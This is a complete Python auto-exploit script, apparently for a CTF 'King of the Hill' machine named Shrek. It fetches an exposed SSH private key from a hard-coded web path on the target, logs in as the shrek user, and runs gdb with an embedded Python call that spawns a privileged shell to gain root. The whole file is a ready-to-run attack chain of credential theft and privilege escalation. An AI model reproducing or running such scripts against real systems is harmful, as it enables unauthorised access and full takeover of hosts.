#!/usr/bin/env python3
import requests
import sys
import os

# Colors
RED     = "\033[91m"
GREEN   = "\033[92m"
YELLOW  = "\033[93m"
BLUE    = "\033[94m"
MAGENTA = "\033[95m"
CYAN    = "\033[96m"
RESET   = "\033[0m"

banner = f"""
{GREEN}[+]==============================[+]
|    {YELLOW}SHREK - KING OF THE HILL{GREEN}    |
|    {CYAN}Auto Exploit Script - KOTH{GREEN}  |
|    {MAGENTA}Made by: Muhamad Rohan Khan{GREEN} |
[+]==============================[+]{RESET}

{YELLOW}Difficulty: — EASY{RESET}
{BLUE}Follow me on LinkedIn:- https://www.linkedin.com/in/muhammadrohankhan{RESET}
"""
print(banner)

if "-i" not in sys.argv or len(sys.argv) < 3:
    print(RED + "[-] Usage: python3 shrek.py -i <target-ip>" + RESET)
    sys.exit(1)

target_ip = sys.argv[2]
print(f"{GREEN}[+] Target IP: {target_ip}{RESET}")

key_url = f"http://{target_ip}/Cpxtpt2hWCee9VFa.txt"
key_file = "id_rsa"

# Remove existing key file if it exists
if os.path.exists(key_file):
    print(f"{YELLOW}[!] Found existing {key_file}, removing it to avoid conflict...{RESET}")
    os.remove(key_file)

print(f"{BLUE}[+] Downloading SSH private key from: {key_url}{RESET}")
try:
    response = requests.get(key_url)
    if "PRIVATE KEY" not in response.text:
        print(RED + "[-] Key not found or invalid content." + RESET)
        sys.exit(1)
    
    with open(key_file, "w") as file:
        file.write(response.text)
    os.chmod(key_file, 0o600)
    print(f"{GREEN}[+] Private key saved to {key_file} and permissions set to 600.{RESET}")
except Exception as e:
    print(f"{RED}[-] Error downloading the key: {e}{RESET}")
    sys.exit(1)

# SSH command
ssh_cmd = f"ssh -i {key_file} shrek@{target_ip} -t 'gdb -nx -ex \"python import os; os.execl(\\\"/bin/sh\\\", \\\"sh\\\", \\\"-p\\\")\" -ex quit'"

print(f"{CYAN}[+] Attempting to connect via SSH and escalate to root using GDB...{RESET}")
os.system(ssh_cmd)
